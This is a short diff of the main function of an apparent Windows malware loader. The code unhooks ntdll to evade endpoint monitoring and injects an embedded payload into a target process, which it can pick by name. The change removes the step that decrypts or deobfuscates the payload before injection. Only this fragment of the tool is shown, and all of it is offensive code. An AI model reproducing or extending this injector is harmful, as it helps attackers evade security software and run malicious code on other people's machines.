@@ -27,39 +27,16 @@ int main() {
     unhookingNtdll();
 #endif
 
-BOOL bSuccess;
-PBYTE pDecryptedPayload = (PBYTE)Payload;
-SIZE_T dwDecryptedPayloadSize = 0;
-
-#if defined(ENCRYPTED_PAYLOAD)
-    bSuccess = decrypt(Payload, PayloadSize, Key, KeySize, Iv, &pDecryptedPayload, &dwDecryptedPayloadSize);
-    if (bSuccess && pDecryptedPayload != NULL) {
-        PayloadSize = dwDecryptedPayloadSize;
-        DebugPrint("[i] Payload decrypted successfully. [size: %d]\n", PayloadSize);
-    }
-#elif defined(OBFUSCATED_PAYLOAD)
-    bSuccess = deobfuscate(Payload, PayloadSize, &pDecryptedPayload, &dwDecryptedPayloadSize);
-    if (bSuccess && pDecryptedPayload != NULL) {
-        PayloadSize = dwDecryptedPayloadSize;
-        DebugPrint("[i] Payload deobfuscated successfully. [size: %d]\n", PayloadSize);
-    }
-#else
-    bSuccess = decrypt(pDecryptedPayload, PayloadSize, NULL, 0, NULL, NULL, NULL);
-#endif
-
-    if (!bSuccess) {
-        DebugPrint("[X] Failed to decrypt payload.\n");
-        return FALSE;
-    }
-
+    BOOL bSuccess;
     DebugPrint("[i] Setup complete... Beginning injection!\n");
 #ifdef PROCESS_NAME_ENABLED
     LPWSTR szProcessName =  (LPWSTR)ProcessName;
     DebugPrint("[i] Targeting process %ws for remote operations...\n", szProcessName);
-    bSuccess = inject_payload(pDecryptedPayload, PayloadSize, szProcessName);
+    bSuccess = inject_payload(Payload, PayloadSize, szProcessName);
 #else
-    bSuccess = inject_payload(pDecryptedPayload, PayloadSize);
+    bSuccess = inject_payload(Payload, PayloadSize);
 #endif
+
 
 #ifdef DEBUG
     if (bSuccess) {
